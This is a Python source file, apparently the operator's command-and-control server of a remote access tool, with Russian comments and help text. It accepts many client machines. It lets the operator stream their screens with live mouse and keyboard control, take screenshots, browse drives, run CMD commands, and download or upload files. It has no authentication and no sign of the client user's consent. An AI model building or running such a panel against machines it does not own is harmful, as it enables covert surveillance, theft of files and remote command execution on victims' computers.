import os
import socket
import struct
import threading
import time
import cv2
import numpy as np

LISTEN_IP = "0.0.0.0"
PORT = 5000

clients = {}  
client_counter = 1
lock = threading.Lock()

current_stream_conn = None
last_frame_dims = (1, 1)
last_move_time = 0 


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        except Exception:
            return None
    return data


def receive_payload(sock):
    try:
        header = recv_exact(sock, 9)
        if not header:
            return False, b"Connection closed"

        status_byte = header[0]
        length = struct.unpack("!Q", header[1:9])[0]

        if length > 500 * 1024 * 1024:  # Лимит до 500 МБ для скачивания файлов
            return False, b"Payload desync error"

        payload = recv_exact(sock, length)
        if payload is None:
            return False, b"Connection closed during payload read"

        success = (status_byte == 1)
        return success, payload
    except Exception as e:
        return False, str(e).encode("utf-8")


def send_payload(sock, status: int, payload: bytes):
    header = struct.pack("!BQ", status, len(payload))
    sock.sendall(header + payload)


def on_cv_mouse(event, x, y, flags, param):
    global current_stream_conn, last_frame_dims, last_move_time
    if not current_stream_conn:
        return

    w, h = last_frame_dims
    rx, ry = (x / w if w else 0), (y / h if h else 0)

    try:
        if event == cv2.EVENT_LBUTTONDOWN:
            current_stream_conn.sendall(f"CLICK:left:{rx:.4f}:{ry:.4f}\n".encode("utf-8"))
        elif event == cv2.EVENT_RBUTTONDOWN:
            current_stream_conn.sendall(f"CLICK:right:{rx:.4f}:{ry:.4f}\n".encode("utf-8"))
        elif event == cv2.EVENT_MOUSEMOVE and (flags & cv2.EVENT_FLAG_LBUTTON):
            current_time = time.time()
            if current_time - last_move_time > 0.03:
                current_stream_conn.sendall(f"MOVE:{rx:.4f}:{ry:.4f}\n".encode("utf-8"))
                last_move_time = current_time
    except Exception:
        pass


def start_screen_stream(conn, client_id, interactive=False):
    global current_stream_conn, last_frame_dims
    current_stream_conn = conn if interactive else None

    mode_str = "Interactive" if interactive else "View Only"
    window_name = f"Live Screen ({mode_str}) - Client #{client_id}"
    cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)

    if interactive:
        cv2.setMouseCallback(window_name, on_cv_mouse)
        print("\n[+] Запущен стрим С УПРАВЛЕНИЕМ.")
    else:
        print("\n[+] Запущен стрим БЕЗ УПРАВЛЕНИЯ.")
    print("[+] Нажимайте 'q' в окне видео для выхода.\n")

    try:
        while True:
            success, payload = receive_payload(conn)
            if not success:
                break

            image_np = np.frombuffer(payload, dtype=np.uint8)
            frame = cv2.imdecode(image_np, cv2.IMREAD_COLOR)

            if frame is not None:
                h, w, _ = frame.shape
                last_frame_dims = (w, h)
                cv2.imshow(window_name, frame)

            key = cv2.waitKey(1) & 0xFF
            if key != 255:
                if key == ord("q"):
                    conn.sendall(b"STOP_STREAM\n")
                    break

                if interactive:
                    if key == 13:      
                        conn.sendall(b"KEY:enter\n")
                    elif key == 8:     
                        conn.sendall(b"KEY:backspace\n")
                    elif key == 32:    
                        conn.sendall(b"KEY:space\n")
                    else:
                        try:
                            char = chr(key)
                            conn.sendall(f"KEY:{char}\n".encode("utf-8"))
                        except ValueError:
                            pass
    except Exception:
        pass
    finally:
        current_stream_conn = None
        cv2.destroyAllWindows()


def accept_connections(server_socket):
    global client_counter
    while True:
        try:
            conn, addr = server_socket.accept()
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            with lock:
                clients[client_counter] = (conn, addr)
                print(f"\n[+] Новое подключение: Клиент #{client_counter} ({addr[0]}:{addr[1]})")
                client_counter += 1
        except Exception:
            break


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, PORT))
    server.listen(5)

    print(f"[*] Сервер запущен на {LISTEN_IP}:{PORT}")
    print("[*] Ожидание клиентов...\n")

    t = threading.Thread(target=accept_connections, args=(server,), daemon=True)
    t.start()

    current_target_id = None

    while True:
        try:
            prompt = f"Server (Client #{current_target_id})> " if current_target_id else "Server> "
            cmd_line = input(prompt).strip()

            if not cmd_line:
                continue

            parts = cmd_line.split(" ", 1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""

            if action == "list":
                with lock:
                    print("\n--- Подключенные клиенты ---")
                    for cid, (conn, addr) in list(clients.items()):
                        print(f" ID: {cid} | IP: {addr[0]}:{addr[1]}")
                    print("----------------------------\n")

            elif action == "help":
                print("""
--- Справка по командам ---
list                      - Список клиентов
select <id>               - Выбрать клиента
back                      - В главное меню
exit                      - Выход

--- Команды для клиента ---
stream [fps] [q]          - Стрим экрана
stream_control [fps] [q]  - Стрим с управлением мышкой/клавиатурой
shot                      - Скриншот
ls                        - Список дисков / папок
cd <путь / диск>          - Перемещение (например: cd C: или cd Windows или cd ..)
cmd <команда>             - Выполнить CMD
download <путь к файлу>   - Скачать файл с клиента
upload <локальный путь>   - Загрузить файл клиенту
""")

            elif action == "select":
                if not arg.isdigit():
                    print("[-] Укажите корректный ID")
                    continue
                cid = int(arg)
                with lock:
                    if cid in clients:
                        current_target_id = cid
                        print(f"[+] Выбран клиент #{cid}")
                    else:
                        print("[-] Клиент не найден.")

            elif action == "back":
                current_target_id = None

            elif action == "exit":
                print("[*] Выход...")
                break

            elif action in ["stream", "stream_control"]:
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue

                conn, _ = clients[current_target_id]
                opts = arg.split()
                fps = opts[0] if len(opts) > 0 and opts[0].isdigit() else "20"
                quality = opts[1] if len(opts) > 1 and opts[1].isdigit() else "35"

                interactive = (action == "stream_control")
                conn.sendall(f"{action} {fps} {quality}".encode("utf-8"))
                start_screen_stream(conn, current_target_id, interactive=interactive)

            elif action in ["cmd", "ls", "cd"]:
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                conn, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                success, payload = receive_payload(conn)
                print(payload.decode("utf-8", errors="replace"))

            elif action == "shot":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                conn, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                success, payload = receive_payload(conn)
                if success:
                    filename = f"screenshot_client_{current_target_id}.jpg"
                    with open(filename, "wb") as f:
                        f.write(payload)
                    print(f"[+] Скриншот сохранен как {filename}")
                else:
                    print(payload.decode("utf-8", errors="replace"))

            elif action == "download":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                conn, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                success, payload = receive_payload(conn)
                if success:
                    filename = os.path.basename(arg) if arg else "downloaded_file"
                    with open(filename, "wb") as f:
                        f.write(payload)
                    print(f"[+] Файл успешно скачан и сохранен как: {filename}")
                else:
                    print(f"[-] Ошибка: {payload.decode('utf-8', errors='replace')}")

            elif action == "upload":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                if not os.path.exists(arg) or not os.path.isfile(arg):
                    print("[-] Локальный файл не найден.")
                    continue
                
                conn, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                
                with open(arg, "rb") as f:
                    file_data = f.read()
                send_payload(conn, 1, file_data)
                
                success, payload = receive_payload(conn)
                print(payload.decode("utf-8", errors="replace"))

            else:
                print("[-] Неизвестная команда. Введите 'help'.")

        except KeyboardInterrupt:
            print("\n[*] Выход...")
            break

    with lock:
        for cid, (conn, _) in clients.items():
            try:
                conn.close()
            except Exception:
                pass
    server.close()

if __name__ == "__main__":
    main()